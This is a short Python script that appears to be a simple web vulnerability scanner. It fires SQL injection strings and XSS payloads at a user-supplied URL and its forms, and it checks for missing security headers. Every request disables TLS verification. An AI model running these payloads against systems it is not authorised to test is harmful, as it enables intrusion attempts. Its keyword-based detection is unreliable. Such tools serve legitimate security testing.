import requests
from bs4 import BeautifulSoup
import re

# Define SQL Injection payloads
SQL_PAYLOADS = ["' OR '1'='1", "' OR '1'='1' --", "' OR 1=1#", "' OR 1=1 --"]
XSS_PAYLOADS = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]

# Function to test SQL Injection
def test_sql_injection(url):
    for payload in SQL_PAYLOADS:
        test_url = f"{url}?id={payload}"
        response = requests.get(test_url, verify=False)
        if "error" in response.text.lower() or "sql" in response.text.lower():
            print(f"Potential SQL Injection vulnerability detected at {test_url}")

# Function to test XSS
def test_xss(url):
    response = requests.get(url, verify=False)
    soup = BeautifulSoup(response.text, 'html.parser')
    forms = soup.find_all('form')
    for form in forms:
        for payload in XSS_PAYLOADS:
            data = {input_tag.get('name', 'input'): payload for input_tag in form.find_all('input')}
            form_action = form.get('action')
            form_url = url + form_action if form_action else url
            res = requests.post(form_url, data=data, verify=False)
            if payload in res.text:
                print(f"Potential XSS vulnerability detected at {form_url}")

# Function to check security headers
def check_security_headers(url):
    response = requests.get(url, verify=False)
    headers = response.headers
    security_headers = ["Content-Security-Policy", "X-Frame-Options", "X-XSS-Protection", "Strict-Transport-Security"]
    for header in security_headers:
        if header not in headers:
            print(f"Missing security header: {header}")

if __name__ == "__main__":
    target_url = input("Enter the target URL: ")
    test_sql_injection(target_url)
    test_xss(target_url)
    check_security_headers(target_url)
